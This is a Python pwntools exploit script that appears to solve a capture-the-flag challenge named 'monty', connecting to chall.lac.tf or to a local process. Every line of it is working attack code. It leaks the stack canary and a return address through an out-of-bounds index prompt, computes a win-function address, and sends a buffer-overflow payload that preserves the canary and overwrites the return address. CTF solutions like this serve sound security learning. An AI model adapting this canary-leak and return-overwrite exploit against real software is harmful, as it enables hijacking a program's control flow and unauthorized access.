from pwn import * 

context.binary = elf = ELF('./monty')

if args['REMOTE']:
	io = remote('chall.lac.tf', 31132)
else:
	io = process([elf.path])
	gdb.attach(io)

canary_index = 55
return_index = canary_index + 2 

io.recvuntil(b'peek? ')
io.sendline(str(canary_index))
io.recvuntil(b'1: ')

leaked_canary = int(io.recvline().strip().decode())
print(leaked_canary)

io.recvuntil(b'peek? ')
io.sendline(str(return_index))
io.recvuntil(b'2: ')

leaked_return = int(io.recvline().strip().decode())
print(leaked_return)

padding = b'a' * 24
win_address = p64(leaked_return - 1093)
offset = b'a' * 8
leaked_canary = p64(leaked_canary)

payload = padding
payload += leaked_canary
payload += offset
payload += win_address

io.recvuntil('lady!')
io.sendline(b'1')
io.recvuntil(b'Name: ')
io.sendline(payload)

io.interactive()
